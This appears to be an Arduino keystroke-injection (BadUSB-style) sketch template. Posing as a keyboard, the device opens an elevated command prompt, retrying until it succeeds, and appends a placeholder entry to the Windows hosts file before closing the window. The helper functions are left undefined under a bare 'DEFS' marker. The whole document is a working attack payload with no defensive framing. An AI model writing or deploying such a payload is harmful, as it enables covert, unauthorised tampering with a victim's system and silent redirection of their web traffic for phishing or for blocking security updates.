void setup(){
  Keyboard.begin();
}
void loop(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println(F("echo INPUT0 INPUT1>>%systemroot%\\system32\\drivers\\etc\\hosts"));
  delay(2000);
  Keyboard.println(F("exit"));
  while(true){};
 }

DEFS
